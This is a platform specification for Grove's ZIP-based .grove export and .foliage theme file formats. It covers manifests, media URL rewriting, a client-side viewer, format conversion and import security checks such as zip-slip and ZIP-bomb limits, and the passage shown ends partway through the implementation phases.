---
title: Grove File Formats — .grove & .foliage
description: Custom ZIP-based file formats for portable Grove exports and theme packages
category: specs
specCategory: platform-services
icon: filearchive
lastUpdated: "2026-02-05"
aliases: []
tags:
  - export
  - import
  - themes
  - portability
  - file-format
  - foliage
  - zip
---

# Grove File Formats — .grove & .foliage

```
                    ┌──────────────────────────────────┐
                    │                                    │
                    │      📦          📦                │
                    │    ╭────╮      ╭────╮              │
                    │    │.grv│      │.flg│              │
                    │    ╰─┬──╯      ╰─┬──╯              │
                    │      │            │                 │
                    │      ▼            ▼                 │
                    │   ┌─────┐    ┌─────────┐           │
                    │   │posts│    │  theme   │           │
                    │   │pages│    │  fonts   │           │
                    │   │media│    │  colors  │           │
                    │   │theme│    │  layout  │           │
                    │   └─────┘    └─────────┘           │
                    │                                    │
                    │     your grove, in your hands      │
                    │                                    │
                    └──────────────────────────────────┘

            carry your grove with you, wherever you go
```

> _A grove is more than data—it's a place you've made your own. These formats let you hold it, share it, and replant it anywhere._

Two ZIP-based file formats that give the Grove ecosystem identity and portability: **`.grove`** for exporting and importing an entire Grove (posts, pages, media, settings, curios, theme), and **`.foliage`** for packaging and sharing themes. Plus a public web viewer and standard format conversion for the open web.

---

## Table of Contents

1. [Overview](#overview)
2. [Design Philosophy](#design-philosophy)
3. [`.grove` File Format](#grove-file-format)
4. [`.foliage` File Format](#foliage-file-format)
5. [`grove.place/open` Public Viewer](#groveplacopen-public-viewer)
6. [Standard Format Migration](#standard-format-migration)
7. [Package Architecture](#package-architecture)
8. [Security](#security)
9. [Implementation Phases](#implementation-phases)
10. [TypeScript Interfaces](#typescript-interfaces)
11. [Integration Points](#integration-points)
12. [Testing Strategy](#testing-strategy)
13. [Accessibility](#accessibility)
14. [Success Metrics](#success-metrics)

---

## Overview

|                   |                                |
| ----------------- | ------------------------------ |
| **Internal Name** | GroveFormats                   |
| **Public Name**   | Grove File Formats             |
| **Package**       | `@autumnsgrove/grove-format`   |
| **Location**      | `libs/grove-format/`       |
| **Dependencies**  | fflate, existing Foliage types |
| **Status**        | Specification                  |

### What This Covers

| System                 | Purpose                                                           |
| ---------------------- | ----------------------------------------------------------------- |
| **`.grove`**           | Full Grove export — posts, pages, media, settings, theme, curios  |
| **`.foliage`**         | Theme package — colors, fonts, layout, custom CSS, preview assets |
| **`grove.place/open`** | Client-side web viewer for browsing .grove and .foliage files     |
| **Standard formats**   | Convert .grove to Markdown+Media ZIP and HTML archive             |

### Why Custom Formats?

Grove's current export is JSON-only — no media binaries, no theme data, no portability. Wanderers deserve to hold their entire grove in a single file they can back up, share, or move. And theme creators need a format to package and distribute their work through the Foliage library and future Terrarium visual editor.

These formats aren't proprietary walls — they're ZIP archives anyone can open. The custom extensions (`.grove`, `.foliage`) give them identity and enable OS-level file associations, while the internal structure is plain JSON, Markdown, and standard media files all the way down.

---

## Design Philosophy

- **Portable by default** — A `.grove` file is a complete, self-contained backup. No external dependencies, no broken image links, no data left behind.
- **Open inside** — Standard ZIP, JSON, Markdown, YAML frontmatter. Any developer can inspect the contents with `unzip` and a text editor.
- **Privacy-first** — Exports include content and settings, never billing details, auth tokens, or secrets. The public viewer extracts files client-side — nothing touches Grove servers.
- **Round-trip fidelity** — Export a grove, import it elsewhere, and the result should be indistinguishable from the original. Data that goes in comes back out.
- **Forward-compatible** — Semantic versioning for format versions. Older readers gracefully skip unknown fields. `minReaderVersion` prevents silent data loss.
- **Terrarium-ready** — `.foliage` is designed for the future Terrarium visual editor from day one. The format accommodates scene compositions, seasonal variants, and community sharing.

---

## `.grove` File Format

### File Extension & MIME Type

| Property                | Value                                                            |
| ----------------------- | ---------------------------------------------------------------- |
| **Extension**           | `.grove`                                                         |
| **MIME type (interim)** | `application/x-grove`                                            |
| **MIME type (future)**  | `application/vnd.autumnsgrove.grove` (pending IANA registration) |
| **Magic bytes**         | Standard ZIP: `PK\x03\x04`                                       |
| **Max file size**       | 2 GB (practical limit for R2 media)                              |

### Internal Structure

```
my-grove.grove
├── manifest.grove              (JSON, STORED/uncompressed, first ZIP entry)
├── content/
│   ├── posts/                  (one Markdown file per post with YAML frontmatter)
│   │   ├── hello-world.md
│   │   ├── my-second-post.md
│   │   └── ...
│   └── pages/                  (one Markdown file per page with YAML frontmatter)
│       ├── about.md
│       ├── now.md
│       └── ...
├── media/                      (binary files downloaded from R2)
│   ├── hero.jpg
│   ├── avatar.png
│   ├── photos/
│   │   └── sunset.webp
│   └── ...
├── theme/
│   ├── settings.json           (ThemeSettings: colors, fonts, layout, custom CSS)
│   ├── thumbnail.png           (theme preview image, optional)
│   └── fonts/                  (custom WOFF2 fonts if Evergreen tier)
│       ├── heading.woff2
│       └── body.woff2
├── settings/
│   ├── site.json               (site title, description, social links, nav)
│   └── curios.json             (curio configurations: timeline, journey, gallery)
└── metadata/
    └── export-info.json        (export timestamp, engine version, tenant plan)
```

#### Why manifest-first, uncompressed?

The `manifest.grove` file is stored as the first entry in the ZIP with `STORED` compression (no deflate). This follows the EPUB pattern — tools can identify the file format by reading just the first few hundred bytes without decompressing the archive. It also allows quick version checking before committing to a full extraction.

### Manifest Schema

`manifest.grove` — the identity card for a `.grove` file:

```json
{
	"format": "grove",
	"formatVersion": "1.0.0",
	"minReaderVersion": "1.0.0",
	"generatedBy": "grove-format/1.0.0",
	"createdAt": "2026-02-05T18:30:00.000Z",

	"grove": {
		"subdomain": "autumn",
		"displayName": "Autumn's Grove",
		"plan": "oak"
	},

	"contents": {
		"posts": 47,
		"pages": 5,
		"mediaFiles": 132,
		"mediaBytes": 48291840,
		"customFonts": 2,
		"curios": ["timeline", "gallery"]
	},

	"checksums": {
		"algorithm": "sha256",
		"manifest": "a1b2c3...",
		"contentIndex": "d4e5f6..."
	}
}
```

| Field                    | Type     | Required | Description                                              |
| ------------------------ | -------- | -------- | -------------------------------------------------------- |
| `format`                 | `string` | Yes      | Always `"grove"`                                         |
| `formatVersion`          | `string` | Yes      | Semantic version of the .grove format                    |
| `minReaderVersion`       | `string` | Yes      | Minimum reader version needed to parse this file         |
| `generatedBy`            | `string` | Yes      | Tool and version that created this file                  |
| `createdAt`              | `string` | Yes      | ISO 8601 timestamp                                       |
| `grove.subdomain`        | `string` | Yes      | Original subdomain (for display, not enforced on import) |
| `grove.displayName`      | `string` | Yes      | Human-readable grove name                                |
| `grove.plan`             | `string` | Yes      | Subscription tier at export time                         |
| `contents.*`             | `object` | Yes      | Content counts for quick preview                         |
| `checksums.algorithm`    | `string` | Yes      | Hash algorithm used (always `sha256`)                    |
| `checksums.manifest`     | `string` | Yes      | Hash of the manifest itself (excluding this field)       |
| `checksums.contentIndex` | `string` | No       | Hash of the content index for integrity verification     |

### Post Frontmatter

Each post is a standalone Markdown file with YAML frontmatter matching the current D1 schema:

```markdown
---
slug: hello-world
title: Hello World
description: My first post in the grove
status: published
tags:
  - introduction
  - personal
featuredImage: ../media/hero.jpg
wordCount: 847
readingTime: 4
publishedAt: 2026-01-15T12:00:00.000Z
createdAt: 2026-01-14T20:30:00.000Z
updatedAt: 2026-01-15T11:45:00.000Z
---

Welcome to my grove! This is where I write about...

![A sunrise over the mountains](../media/photos/sunrise.webp)
```

| Frontmatter Field | Type        | Source Column                   | Notes                            |
| ----------------- | ----------- | ------------------------------- | -------------------------------- |
| `slug`            | `string`    | `posts.slug`                    | URL-safe identifier              |
| `title`           | `string`    | `posts.title`                   |                                  |
| `description`     | `string?`   | `posts.description`             |                                  |
| `status`          | `string`    | `posts.status`                  | `draft`, `published`, `archived` |
| `tags`            | `string[]`  | `posts.tags` (parsed from JSON) |                                  |
| `featuredImage`   | `string?`   | `posts.featured_image`          | Rewritten to relative path       |
| `wordCount`       | `number`    | `posts.word_count`              |                                  |
| `readingTime`     | `number`    | `posts.reading_time`            | Minutes                          |
| `gutterContent`   | `object[]?` | `posts.gutter_content` (parsed) | Preserved for round-trip         |
| `publishedAt`     | `string?`   | `posts.published_at`            | ISO 8601                         |
| `createdAt`       | `string`    | `posts.created_at`              | ISO 8601                         |
| `updatedAt`       | `string`    | `posts.updated_at`              | ISO 8601                         |

### Page Frontmatter

```markdown
---
slug: about
title: About Me
description: A little about who I am
type: page
font: default
hero: null
gutterContent: []
createdAt: 2026-01-10T09:00:00.000Z
updatedAt: 2026-01-20T14:15:00.000Z
---

I'm a writer, maker, and digital gardener...
```

| Frontmatter Field | Type       | Source Column                   | Notes               |
| ----------------- | ---------- | ------------------------------- | ------------------- |
| `slug`            | `string`   | `pages.slug`                    |                     |
| `title`           | `string`   | `pages.title`                   |                     |
| `description`     | `string?`  | `pages.description`             |                     |
| `type`            | `string`   | `pages.type`                    | Default `"page"`    |
| `font`            | `string`   | `pages.font`                    | Default `"default"` |
| `hero`            | `object?`  | `pages.hero` (parsed from JSON) | Hero configuration  |
| `gutterContent`   | `object[]` | `pages.gutter_content` (parsed) |                     |
| `createdAt`       | `string`   | `pages.created_at`              | ISO 8601            |
| `updatedAt`       | `string`   | `pages.updated_at`              | ISO 8601            |

### Media Handling

During export, media files are downloaded from R2 and written into the `media/` directory. All media URLs in post and page content are rewritten from absolute R2 URLs to relative paths:

```
Before (in D1):    https://media.grove.place/autumn/hero.jpg
After (in .grove): ../media/hero.jpg
```

A media index is stored alongside the files for import reconstruction:

```json
// media/.index.json
[
	{
		"filename": "hero.jpg",
		"originalName": "my-photo.jpg",
		"path": "hero.jpg",
		"size": 245760,
		"mimeType": "image/jpeg",
		"altText": "A sunset over rolling hills",
		"width": 1920,
		"height": 1080,
		"uploadedAt": "2026-01-12T16:00:00.000Z"
	}
]
```

#### URL Rewriting Rules

| Context              | Pattern                                | Replacement                   |
| -------------------- | -------------------------------------- | ----------------------------- |
| Post markdown body   | `https://media.grove.place/{tenant}/*` | `../media/*`                  |
| Post `featuredImage` | Absolute R2 URL                        | `../media/{filename}`         |
| Page markdown body   | Same as posts                          | `../media/*`                  |
| Page `hero` JSON     | Absolute R2 URL                        | `../media/{filename}`         |
| Theme `thumbnail`    | Absolute R2 URL                        | `thumbnail.png` (in `theme/`) |

On import, the reverse happens — relative paths are resolved against the new tenant's media upload path.

### Site Settings

```json
// settings/site.json
{
	"title": "Autumn's Grove",
	"description": "A place to write and think out loud",
	"socialLinks": {
		"github": "https://github.com/autumn",
		"mastodon": "https://mastodon.social/@autumn"
	},
	"navigation": [
		{ "label": "About", "href": "/about" },
		{ "label": "Now", "href": "/now" }
	],
	"accentColor": "#4a7c59",
	"customDomain": null,
	"timezone": "America/Chicago"
}
```

Settings are exported from `tenant_settings` (key-value pairs) and flattened into a single JSON object. On import, they're split back into individual `tenant_settings` rows.

### Curio Configurations

```json
// settings/curios.json
{
	"timeline": {
		"enabled": true,
		"voicePreset": "professional",
		"customSystemPrompt": null,
		"openrouterModel": "deepseek/deepseek-v3.2"
	},
	"gallery": {
		"enabled": true,
		"layout": "masonry",
		"columns": 3
	}
}
```

Curio configs are exported from their respective `*_curio_config` tables. **Encrypted secrets** (API tokens, keys) are **never exported** — only the non-sensitive configuration fields.

### What's Included vs. Excluded

| Included                                 | Excluded                            |
| ---------------------------------------- | ----------------------------------- |
| Posts (markdown + metadata)              | Auth tokens, session data           |
| Pages (markdown + metadata)              | Billing information, Stripe IDs     |
| Media files (actual binaries)            | Encrypted API keys in curio configs |
| Theme settings (colors, fonts, CSS)      | User email (beyond display name)    |
| Site settings (title, nav, social links) | Password hashes                     |
| Curio configurations (non-secret)        | Audit logs                          |
| Custom fonts (WOFF2 files)               | Rate limit counters                 |
| Gutter content                           | Feature flag overrides              |
| Display name                             | Other tenants' data                 |

### Export Info

```json
// metadata/export-info.json
{
	"exportedAt": "2026-02-05T18:30:00.000Z",
	"engineVersion": "2.4.1",
	"formatLibraryVersion": "1.0.0",
	"exportType": "full",
	"exportDurationMs": 4200,
	"tenantPlan": "oak",
	"environment": "production"
}
```

---

## `.foliage` File Format

### File Extension & MIME Type

| Property                | Value                                                              |
| ----------------------- | ------------------------------------------------------------------ |
| **Extension**           | `.foliage`                                                         |
| **MIME type (interim)** | `application/x-foliage`                                            |
| **MIME type (future)**  | `application/vnd.autumnsgrove.foliage` (pending IANA registration) |
| **Magic bytes**         | Standard ZIP: `PK\x03\x04`                                         |
| **Max file size**       | 20 MB (themes are lightweight — fonts are the heaviest part)       |

### Internal Structure

```
my-theme.foliage
├── manifest.foliage            (JSON, STORED/uncompressed, first ZIP entry)
├── theme.json                  (full Theme object)
├── custom-css/
│   └── styles.css              (custom CSS, validated, max 10KB)
├── fonts/
│   ├── heading.woff2           (custom heading font, if any)
│   └── body.woff2              (custom body font, if any)
├── preview/
│   ├── thumbnail.png           (required: 1200×630 preview card)
│   └── screenshots/            (optional gallery screenshots)
│       ├── light.png
│       ├── dark.png
│       └── mobile.png
└── metadata/
    ├── author.json             (creator display name, grove URL — no PII)
    └── compatibility.json      (min Foliage version, tier requirements)
```

### Manifest Schema

```json
{
	"format": "foliage",
	"formatVersion": "1.0.0",
	"minReaderVersion": "1.0.0",
	"generatedBy": "grove-format/1.0.0",
	"createdAt": "2026-02-05T18:30:00.000Z",

	"theme": {
		"id": "cozy-cabin",
		"name": "Cozy Cabin",
		"description": "Warm browns and intimate spacing — like writing by firelight",
		"tags": ["warm", "cozy", "dark", "intimate"],
		"baseTheme": "grove"
	},

	"contents": {
		"hasCustomCSS": true,
		"customCSSBytes": 2048,
		"customFonts": 1,
		"screenshots": 3,
		"hasThumbnail": true
	},

	"checksums": {
		"algorithm": "sha256",
		"manifest": "f1e2d3..."
	}
}
```

| Field               | Type       | Required | Description                             |
| ------------------- | ---------- | -------- | --------------------------------------- |
| `format`            | `string`   | Yes      | Always `"foliage"`                      |
| `formatVersion`     | `string`   | Yes      | Semantic version of the .foliage format |
| `minReaderVersion`  | `string`   | Yes      | Minimum reader version to parse         |
| `theme.id`          | `string`   | Yes      | Unique theme identifier (kebab-case)    |
| `theme.name`        | `string`   | Yes      | Human-readable theme name               |
| `theme.description` | `string`   | Yes      | Short description (max 200 chars)       |
| `theme.tags`        | `string[]` | Yes      | Searchable tags (max 10)                |
| `theme.baseTheme`   | `string?`  | No       | Parent theme ID if this is a variant    |
| `contents.*`        | `object`   | Yes      | Content summary                         |

### Theme Object (`theme.json`)

The full theme definition, matching the Foliage type system:

```json
{
	"id": "cozy-cabin",
	"name": "Cozy Cabin",
	"description": "Warm browns and intimate spacing — like writing by firelight",
	"thumbnail": "preview/thumbnail.png",
	"tier": "sapling",

	"colors": {
		"background": "#2a1f1a",
		"surface": "#3d2e25",
		"foreground": "#e8ddd4",
		"foregroundMuted": "#b8a99e",
		"accent": "#d4915e",
		"border": "#5a4a3f"
	},

	"fonts": {
		"heading": "Lora",
		"body": "Lexend",
		"mono": "JetBrains Mono"
	},

	"layout": {
		"type": "sidebar",
		"maxWidth": "72rem",
		"spacing": "comfortable"
	},

	"glass": {
		"enabled": true,
		"opacity": 0.6,
		"blur": 12
	},

	"seasonal": {
		"enabled": false,
		"variants": {}
	},

	"customCSS": "custom-css/styles.css"
}
```

### Validation Requirements

Every `.foliage` file is validated on both creation and import:

#### Color Contrast (WCAG AA)

- `foreground` on `background`: minimum 4.5:1 ratio for body text
- `foreground` on `surface`: minimum 4.5:1 ratio
- `accent` on `background`: minimum 3:1 ratio for large text / interactive elements
- Validation uses relative luminance calculation per WCAG 2.1

#### CSS Sanitization

- Maximum 10 KB
- Reuses Foliage's `validateCustomCSS()` function
- Blocked patterns: `@import`, `url()` with external domains, `expression()`, `javascript:`, `behavior:`, `-moz-binding`
- Allowed `url()` targets: only relative paths within the archive (`fonts/`, `preview/`)

#### Font Validation

- WOFF2 format required (WOFF optional fallback)
- Maximum 500 KB per font file
- Maximum 5 custom fonts per theme
- Validates WOFF2 magic bytes (`wOF2`)
- Reuses Foliage's `validateWoff2()` function

#### Image Validation

- Thumbnail required: PNG or WebP, 1200×630 pixels
- Screenshots optional: PNG or WebP, max 1920×1080, max 5 screenshots
- Maximum 2 MB per image
- Validates image magic bytes (PNG: `\x89PNG`, WebP: `RIFF...WEBP`)

### Author Metadata

```json
// metadata/author.json
{
	"displayName": "Autumn",
	"groveUrl": "https://autumn.grove.place",
	"createdAt": "2026-02-05T18:30:00.000Z"
}
```

No email, user ID, or private information — only what the creator chooses to display publicly. The `groveUrl` links back to the creator's grove for attribution.

### Compatibility Metadata

```json
// metadata/compatibility.json
{
	"minFoliageVersion": "1.0.0",
	"minTier": "sapling",
	"requiresCustomFonts": false,
	"requiresCustomCSS": true,
	"requiresGlass": true,
	"terrarium": {
		"compatible": false,
		"sceneData": null
	}
}
```

| Field                  | Description                                          |
| ---------------------- | ---------------------------------------------------- |
| `minFoliageVersion`    | Minimum Foliage library version to render this theme |
| `minTier`              | Lowest subscription tier that can use this theme     |
| `requiresCustomFonts`  | Whether the theme depends on included WOFF2 files    |
| `requiresCustomCSS`    | Whether the theme depends on `custom-css/styles.css` |
| `requiresGlass`        | Whether the theme uses glassmorphism effects         |
| `terrarium.compatible` | Whether this was exported from Terrarium (future)    |
| `terrarium.sceneData`  | Path to Terrarium scene JSON if applicable (future)  |

### Terrarium Integration (Future)

When Terrarium ships, it will export `.foliage` files containing scene compositions. The format is forward-compatible:

```json
// metadata/compatibility.json (Terrarium-exported theme)
{
	"terrarium": {
		"compatible": true,
		"sceneData": "terrarium/scene.json",
		"terrariumVersion": "1.0.0"
	}
}
```

An additional `terrarium/` directory may appear inside the archive:

```
terrarium/
├── scene.json              (component positions, sizes, layers)
├── decorations.json        (nature component references)
└── animations.json         (animation configs, if any)
```

Readers that don't understand Terrarium data will use the static `theme.json` and ignore the `terrarium/` directory — degrading gracefully to a flat theme.

### Community Theme Round-Trip

The `.foliage` format supports the full community theme lifecycle:

```
Creator designs theme in Foliage → Exports .foliage
                                          ↓
                              Uploads to Foliage Library
                                          ↓
                              Other Wanderers browse, preview
                                          ↓
                              Import → applies to their grove
                                          ↓
                              Customizer tweaks → exports new .foliage
```

Community themes stored in D1 can be exported to `.foliage` and re-imported without loss. The `theme.id` serves as the identity link — if a `.foliage` file has the same ID as an existing community theme, the importer can offer to update rather than duplicate.

---

## `grove.place/open` Public Viewer

### Overview

A public, no-auth-required page at `grove.place/open` where anyone can drag-and-drop a `.grove` or `.foliage` file to browse its contents. Everything happens client-side — files never leave the browser.

**Route:** `apps/landing/src/routes/open/+page.svelte`

### Core Features

#### File Input

- Drag-and-drop zone (full-page on hover, targeted box otherwise)
- File picker button as fallback
- Accepts `.grove` and `.foliage` extensions
- Validates magic bytes before extraction

#### `.grove` Viewer

- **Browse posts:** Rendered Markdown with syntax highlighting
- **Browse pages:** Same as posts
- **Media gallery:** Grid view of all images/media with lazy loading
- **Theme preview:** Live preview of the grove's theme settings
- **Site info:** Title, description, social links from `settings/site.json`
- **Export stats:** Counts from manifest (posts, pages, media, total size)

#### `.foliage` Viewer

- **Live theme preview:** Applies theme colors/fonts to sample content
- **Color palette:** Visual swatch display of all theme colors
- **Font preview:** Sample text rendered in theme fonts
- **Custom CSS:** Highlighted code view of custom CSS
- **Screenshot gallery:** If screenshots are included
- **Compatibility badge:** Shows minimum tier, Terrarium compatibility

#### Import Button

- "Import to my Grove" button visible on both viewers
- Requires authentication — clicking triggers Heartwood OAuth flow if not signed in
- After auth, opens import confirmation dialog with:
  - Content summary (what will be imported)
  - Conflict resolution options (merge vs. replace)
  - Tier compatibility check (warns if theme requires higher tier)

### Technical Implementation

#### Client-Side ZIP Extraction

- **Library:** fflate (~8 KB gzipped) — works in Workers and browsers, supports streaming
- **No server upload** — all extraction happens in a Web Worker to avoid blocking the main thread
- **Progressive rendering** — content appears as it's extracted, manifest first
- **Memory management** — large media files processed as streams, not buffered entirely

#### URL Sharing

- After opening a file, generate a shareable URL with format:
  `grove.place/open#type=grove&name=my-grove&posts=47&pages=5`
- No file data in the URL — the hash just describes what was opened
- Visitors to a shared URL see a "this person shared a .grove file" landing with instructions to get their own

#### PWA File Handlers

Register in the web app manifest for OS-level file association:

```json
// apps/landing/static/manifest.json
{
	"file_handlers": [
		{
			"action": "/open",
			"accept": {
				"application/x-grove": [".grove"],
				"application/x-foliage": [".foliage"]
			}
		}
	]
}
```

When Grove is installed as a PWA, double-clicking a `.grove` or `.foliage` file opens it directly in the viewer.

### UI Design

```
┌─────────────────────────────────────────────────┐
│  🌲 Grove                        Sign In        │
├─────────────────────────────────────────────────┤
│                                                  │
│  ╭──────────────────────────────────────────╮    │
│  │                                          │    │
│  │   📦 Drop a .grove or .foliage file      │    │
│  │           here to explore it              │    │
│  │                                          │    │
│  │       [ Choose File ]                     │    │
│  │                                          │    │
│  ╰──────────────────────────────────────────╯    │
│                                                  │
│  Your files never leave your browser.            │
│  Everything is extracted locally.                │
│                                                  │
└─────────────────────────────────────────────────┘
```

After opening a `.grove` file:

```
┌─────────────────────────────────────────────────┐
│  🌲 Grove                        Sign In        │
├─────────────────────────────────────────────────┤
│                                                  │
│  Autumn's Grove                                  │
│  47 posts · 5 pages · 132 media files            │
│  Exported Feb 5, 2026 · Oak tier                 │
│                                                  │
│  ┌────────┬────────┬────────┬────────┐           │
│  │ Posts  │ Pages  │ Media  │ Theme  │           │
│  └────────┴────────┴────────┴────────┘           │
│                                                  │
│  ┌─────────────────────────────────────┐         │
│  │  Hello World                        │         │
│  │  Published Jan 15, 2026             │         │
│  │  Tags: introduction, personal       │         │
│  │  ───────────────────────────────    │         │
│  │  Welcome to my grove! This is...    │         │
│  └─────────────────────────────────────┘         │
│                                                  │
│  [ Import to my Grove ]                          │
│                                                  │
└─────────────────────────────────────────────────┘
```

---

## Standard Format Migration

For Wanderers who want to leave Grove (we'll miss you) or use their content with other tools, `.grove` files can be converted to standard open formats.

### Markdown + Media ZIP

```
grove-export-markdown.zip
├── posts/
│   ├── 2026-01-15-hello-world.md       (YAML frontmatter + markdown body)
│   ├── 2026-01-20-second-post.md
│   └── ...
├── pages/
│   ├── about.md
│   ├── now.md
│   └── ...
├── media/
│   ├── images/
│   │   ├── hero.jpg
│   │   └── sunrise.webp
│   └── ...
└── README.md
```

#### Design Decisions

- **Date-prefixed filenames:** Posts use `YYYY-MM-DD-{slug}.md` for natural sorting and SSG compatibility (Hugo, Jekyll, Astro all expect this)
- **YAML frontmatter preserved:** Same frontmatter as `.grove` posts/pages, minus Grove-specific fields (`gutterContent`)
- **Relative media paths:** All images referenced as `../media/images/{filename}`
- **README.md:** Explains the structure, lists compatible SSGs, includes brief migration guide

#### Frontmatter Mapping

Grove-specific fields are transformed for standard Markdown:

```yaml
# .grove post frontmatter         # Standard markdown frontmatter
slug: hello-world                  slug: hello-world
title: Hello World          →      title: Hello World
status: published                  draft: false
tags: [intro, personal]            tags: [intro, personal]
featuredImage: ../media/hero.jpg   image: ../media/images/hero.jpg
publishedAt: 2026-01-15T...       date: 2026-01-15T...
```

### HTML Archive

```
grove-export-html.zip
├── index.html                      (post listing page)
├── posts/
│   ├── hello-world.html            (styled, standalone)
│   ├── second-post.html
│   └── ...
├── pages/
│   ├── about.html
│   └── ...
├── media/
│   ├── hero.jpg
│   └── ...
└── styles/
    └── grove.css                   (minimal, readable styling)
```

#### Design Decisions

- **Standalone HTML:** Each file is a complete, valid HTML document — no build step required, open in any browser
- **Minimal styling:** `grove.css` provides comfortable reading typography, responsive layout, and a warm color palette inspired by Grove's default theme. No JavaScript.
- **Index page:** Simple post listing with titles, dates, and descriptions — functions as a basic homepage
- **Semantic HTML:** Uses `<article>`, `<header>`, `<nav>`, `<time>` — accessible and machine-readable
- **Relative paths:** All media references use relative paths for offline viewing

### Conversion Pipeline

```
.grove file
    │
    ├── grove-format.parse()        Read and validate the .grove archive
    │
    ├── grove-format.toMarkdown()   Transform to standard markdown format
    │   ├── Rewrite frontmatter (remove Grove-specific fields)
    │   ├── Date-prefix filenames
    │   ├── Copy media to images/ subdirectory
    │   └── Generate README.md
    │
    └── grove-format.toHTML()       Transform to HTML archive
        ├── Render markdown to HTML
        ├── Wrap in semantic HTML template
        ├── Generate index.html listing
        ├── Write grove.css
        └── Copy media with relative paths
```

Both converters are pure functions — no side effects, no network access. They take a parsed `.grove` file and return a ZIP buffer.

---

## Package Architecture

### New Package: `libs/grove-format/`

A standalone TypeScript library (not SvelteKit) that handles all format operations. It needs to work in three environments:

| Environment            | Use Case                                                      |
| ---------------------- | ------------------------------------------------------------- |
| **Cloudflare Workers** | Server-side export (`/api/export`) and import (`/api/import`) |
| **Browser**            | `grove.place/open` viewer, client-side import                 |
| **CLI**                | Future `gw export` and `gw import` commands                   |

```
libs/grove-format/
├── package.json
├── tsconfig.json
├── src/
│   ├── index.ts                    (public API)
│   ├── grove/
│   │   ├── create.ts               (.grove file creation — ZIP packing)
│   │   ├── parse.ts                (.grove file reading — ZIP extraction)
│   │   ├── manifest.ts             (manifest validation and creation)
│   │   ├── media.ts                (URL rewriting, media index)
│   │   └── types.ts                (.grove-specific TypeScript types)
│   ├── foliage/
│   │   ├── create.ts               (.foliage file creation)
│   │   ├── parse.ts                (.foliage file reading)
│   │   ├── manifest.ts             (manifest validation)
│   │   ├── validate.ts             (WCAG contrast, CSS sanitization, font checks)
│   │   └── types.ts                (.foliage-specific types)
│   ├── convert/
│   │   ├── to-markdown.ts          (.grove → Markdown+Media ZIP)
│   │   ├── to-html.ts              (.grove → HTML archive)
│   │   └── templates/              (HTML templates, grove.css)
│   ├── shared/
│   │   ├── zip.ts                  (fflate wrapper: create/extract with validation)
│   │   ├── security.ts             (path traversal, size limits, bomb detection)
│   │   ├── checksum.ts             (SHA-256 computation)
│   │   └── version.ts              (semver comparison for format versions)
│   └── __tests__/
│       ├── grove.test.ts
│       ├── foliage.test.ts
│       ├── convert.test.ts
│       └── security.test.ts
└── dist/                           (built output)
```

### Public API

```typescript
import {
	// .grove operations
	createGroveFile,
	parseGroveFile,
	validateGroveFile,

	// .foliage operations
	createFoliageFile,
	parseFoliageFile,
	validateFoliageFile,

	// Standard format conversion
	groveToMarkdown,
	groveToHTML,

	// Utilities
	isGroveFile,
	isFoliageFile,
	getManifest,

	// Types
	type GroveManifest,
	type FoliageManifest,
	type GroveFileContents,
	type FoliageFileContents,
	type ParseOptions,
	type CreateGroveOptions,
	type CreateFoliageOptions,
} from "@autumnsgrove/grove-format";
```

### Key Dependency: fflate

**Why fflate over JSZip:**

|               | fflate               | JSZip              |
| ------------- | -------------------- | ------------------ |
| **Size**      | ~8 KB gzipped        | ~45 KB gzipped     |
| **Workers**   | Full support         | Requires polyfills |
| **Streaming** | Native streaming API | Limited            |
| **Speed**     | 2-5× faster          | Baseline           |
| **API**       | Callback/sync        | Promise-based      |

fflate provides `zipSync()` / `unzipSync()` for small files and `zip()` / `unzip()` with streaming for large archives. The `STORED` compression mode (no deflate) is supported for the manifest-first pattern.

---

## Security

### Zip Slip Prevention

Every path extracted from a ZIP archive is validated:

```typescript
function validatePath(path: string): boolean {
	// Reject absolute paths
	if (path.startsWith("/") || path.startsWith("\\")) return false;

	// Reject path traversal
	if (path.includes("..")) return false;

	// Reject Windows-style paths
	if (/^[a-zA-Z]:/.test(path)) return false;

	// Reject null bytes
	if (path.includes("\0")) return false;

	// Normalize and verify it stays within root
	const normalized = path.split("/").filter((s) => s !== "." && s !== "");
	return normalized.length > 0 && normalized.every((s) => s !== "..");
}
```

### ZIP Bomb Protection

| Limit                    | Value                           | Rationale                     |
| ------------------------ | ------------------------------- | ----------------------------- |
| Max archive size         | 2 GB (.grove), 20 MB (.foliage) | Prevents storage exhaustion   |
| Max individual file      | 500 MB                          | Largest reasonable media file |
| Max total extracted size | 4 GB (.grove), 50 MB (.foliage) | Prevents decompression bombs  |
| Max compression ratio    | 100:1                           | Flags suspicious entries      |
| Max file count           | 10,000 (.grove), 50 (.foliage)  | Prevents directory exhaustion |
| Max path depth           | 10 levels                       | Prevents deeply nested paths  |

```typescript
function checkCompressionRatio(compressedSize: number, uncompressedSize: number): boolean {
	if (compressedSize === 0) return false;
	return uncompressedSize / compressedSize <= 100;
}
```

### CSS Injection Prevention

Custom CSS in `.foliage` files is sanitized before application:

- **Blocked:** `@import`, external `url()`, `expression()`, `javascript:`, `behavior:`, `-moz-binding`, `<!`
- **Blocked selectors:** Anything targeting elements outside the theme scope (no `body`, `html`, `#__sveltekit_*`)
- **Allowed `url()`:** Only relative paths to fonts and images within the archive
- **Size limit:** 10 KB maximum
- **Reuses:** Foliage's existing `validateCustomCSS()` function

### Import Security

The import endpoint (`/api/import`) has additional protections:

| Measure             | Implementation                                              |
| ------------------- | ----------------------------------------------------------- |
| CSRF validation     | `validateCSRF(request)` on POST                             |
| Authentication      | `locals.user` required                                      |
| Tenant verification | `getVerifiedTenantId()` — can only import to your own grove |
| Rate limiting       | Extend existing export rate limiter (10/hour)               |
| Audit logging       | Log to `audit_log` with category `data_import`              |
| Size validation     | Check archive size before extraction                        |
| Content validation  | Validate manifest, check format version                     |
| Media scanning      | Validate MIME types match file contents (magic bytes)       |

### No Executable Code

Both formats explicitly forbid:

- JavaScript files (`.js`, `.mjs`, `.cjs`)
- HTML files (except in `.grove` HTML export conversion output)
- Server-side scripts (`.php`, `.py`, `.rb`, `.sh`)
- WebAssembly (`.wasm`)
- SVG with embedded scripts (validate SVG files for `<script>` tags)

If any forbidden file type is found during extraction, the entire archive is rejected.

---

## Implementation Phases

### Phase 1: Core Library

_`libs/grove-format/` with .grove and .foliage read/write_

- Set up package with fflate dependency
- Implement ZIP creation with manifest-first pattern
- Implement ZIP extraction with full security validation
- `.grove` create/parse with all content types
- `.foliage` create/parse with theme validation
- Comprehensive test suite (round-trip, security, edge cases)

### Phase 2: Export Integration

_Wire into existing `/api/export` with new format option_

- Add `format: "grove"` option to existing export request body
- Download media from R2 into ZIP during export
- Rewrite media URLs to relative paths
